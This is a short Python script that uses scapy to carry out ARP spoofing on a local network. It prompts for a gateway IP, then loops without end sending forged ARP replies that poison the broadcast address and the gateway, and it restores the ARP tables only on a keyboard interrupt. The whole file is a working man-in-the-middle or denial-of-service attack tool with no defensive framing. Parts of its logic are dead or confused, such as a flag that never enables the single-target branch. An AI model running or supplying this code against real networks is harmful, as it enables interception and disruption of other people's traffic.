import os
import sys
from scapy.all import *
import time

single = 0
gateway = input("Gateway IP: ")
#	if (sys.argv[1] != '-a'):
#	if(len(sys.argv) < 2):
#		target = input("Target IP: ")
#		single = 1
local = get_if_addr(conf.iface)


print ("Local IP: " + local)

def spoof(target_ip, gateway_ip):
	target_mac = getmacbyip(target_ip)
	packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
	send(packet, verbose=True) #False)

def restore(dest_ip, src_ip):
	dest_mac = getmacbyip(dest_ip)
	src_mac = getmacbyip(src_ip)
	packet = ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=dest_ip, hwdst=dest_mac)
	send(packet, verbose=True) #False)


try:
	while single:
		target = sys.argv[1] # single == 0, so it wont ever start loop; supposed to be your target
		spoof(target, gateway)
		spoof(gateway, local)
		print ("Packet sent")
		time.sleep(2)
	while not single:
		target = '192.168.1.255'
		spoof(target, gateway)
		spoof(gateway, local)
except KeyboardInterrupt:
	print("\nRestoring ARP tables")
	restore(target, gateway)
	restore(gateway, target)

